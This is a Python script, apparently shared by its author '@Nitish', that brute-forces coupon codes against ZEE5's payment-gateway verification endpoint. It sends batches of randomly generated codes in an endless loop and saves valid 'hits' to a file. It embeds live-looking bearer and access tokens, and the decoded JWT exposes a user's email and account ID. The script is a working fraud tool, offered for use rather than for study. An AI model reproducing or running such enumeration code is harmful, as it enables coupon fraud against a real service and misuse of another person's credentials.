import json
import asyncio
from random import choices
from aiohttp import ClientSession
from string import digits, ascii_uppercase

# ANSI escape codes for color formatting
GREEN = '\033[92m'  # Green
RED = '\033[91m'    # Red
ENDC = '\033[0m'    # End color

print(f"{GREEN}                             By:-@Nitish")
zee5_url = "https://securepayment.zee5.com/paymentGateway/coupon/verification"

headers = {
     "Authorization": "bearer eyJraWQiOiJlNmxfbGYweHpwYVk4VzBNcFQzWlBzN2hyOEZ4Y0trbDhDV0JaekVKT2lBIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiI3MGMwZTU5NS1mNzZhLTQyMWItODEyOS1hYzcyM2NlYTBhY2YiLCJzdWJzY3JpcHRpb25zIjoiW10iLCJhY3RpdmF0aW9uX2RhdGUiOiIyMDIzLTA1LTMwIDA2OjE4OjM4LjE0MyIsImFtciI6WyJkZWxlZ2F0aW9uIl0sImlzcyI6Imh0dHBzOi8vdXNlcmFwaS56ZWU1LmNvbSIsImN1cnJlbnRfY291bnRyeSI6IklOIiwiY2xpZW50X2lkIjoicmVmcmVzaF90b2tlbiIsImFjY2Vzc190b2tlbl90eXBlIjoiRGVmYXVsdFByaXZpbGVnZSIsInVzZXJfdHlwZSI6IlJlZ2lzdGVyZWQiLCJzY29wZSI6WyJ1c2VyYXBpIiwic3Vic2NyaXB0aW9uYXBpIiwicHJvZmlsZWFwaSJdLCJhdXRoX3RpbWUiOjE2ODU0Mjc1MTgsImV4cCI6MTY4ODA1NzUxOCwiaWF0IjoxNjg1NDI3NTE4LCJ1c2VyX2VtYWlsIjoidGhvcm9wQHJlZGlmZm1haWwuY29tIiwiZGV2aWNlX2lkIjoic3FXOEdpbHJwMFBpaFZkY3ZUeUUwMDAwMDAwMDAwMDAiLCJyZWdpc3RyYXRpb25fY291bnRyeSI6IklOIiwidmVyc2lvbiI6NCwiYXVkIjpbInVzZXJhcGkiLCJzdWJzY3JpcHRpb25hcGkiLCJwcm9maWxlYXBpIl0sInN5c3RlbSI6Ilo1IiwibmJmIjoxNjg1NDI3NTE4LCJpZHAiOiJsb2NhbCIsInVzZXJfaWQiOiI3MGMwZTU5NS1mNzZhLTQyMWItODEyOS1hYzcyM2NlYTBhY2YiLCJjcmVhdGVkX2RhdGUiOiIyMDIzLTA1LTMwIDA2OjE4OjM4LjE0MyIsImFjdGl2YXRlZCI6dHJ1ZX0.2SHAC_7FMotO9rNpNKDPVtr6HieMF_1VgIEwFBZsyWQ76qvaDI4nfHWX7PWJfuHhZvMLjsGUHG0CcYWGPtOC50tgxjifqbMYeWy6HvkRConWaBSZOl1ZBzxR3VLQKuQ_dWNbZ0fvATWf6OHhlQRGOelP_n68Ai6WofSOOhl3QRb3LJFFXQvD6AaOYxJTYfpmedk1tG48m0wjF-q5SZNqzYfFsZYUzznTNoa4mpczRhYN8ZeWRarxl1JBj3Az4QLIX3vrzekjpSGS52Tm47_YWMCHzpUq2Ph4IpzX3my_Ii5V8O8A-HpavklF9buJAkLA1T03m0ciOTxYXehiDLto2g",
    "X-Access-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwbGF0Zm9ybV9jb2RlIjoiV2ViQCQhdDM4NzEyIiwiaXNzdWVkQXQiOiIyMDIzLTA1LTI5VDIxOjIwOjE3LjY5N1oiLCJwcm9kdWN0X2NvZGUiOiJ6ZWU1QDk3NSIsInR0bCI6ODY0MDAwMDAsImlhdCI6MTY4NTM5NTIxN30.OQNpUQFLdqoxZVuQuHhrRLOHE_pQktzNMP2XAQbLivE",
    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Mobile Safari/537.36",
    "Accept": "*/*",
    "Origin": "https://www.zee5.com",
    "Referer": "https://www.zee5.com/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-3K,en;q=3.9",
    "Connection": "close"
}

async def coupon_request(session, coupon_code):
    params = {
        "coupon_code": coupon_code,
        "translation": "en",
        "country_code": "IN",
    }
    async with session.get(zee5_url, headers=headers, params=params) as response:
        return await response.text(), response.status, coupon_code

async def send_requests(batch):
    characters = digits + ascii_uppercase
    coupon_codes = ['Z5CPMA23Y' + ''.join(choices(characters, k=5)) for _ in range(batch)]

    async with ClientSession() as session:
        tasks = [coupon_request(session, coupon_code) for coupon_code in coupon_codes]
        responses = await asyncio.gather(*tasks)

        with open("results.txt", "a") as results_file:
            for response, status, coupon_code in responses:
                if status == 403:
                    continue

                try:
                    r_json = json.loads(response)
                    if 'code' in r_json and r_json['code'] == 200:
                        print(f"{GREEN}Valid ✅: {coupon_code}  : By:-@Nitish")
                        results_file.write(f"Hit {coupon_code} : By:-@Nitish\n")
                    else:
                        print(f"{RED}Invalid❌:{coupon_code} : By:-Nitish")
                except json.JSONDecodeError:
                    pass

async def main():
    while True:
        await send_requests(50)
        await asyncio.sleep(1)

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
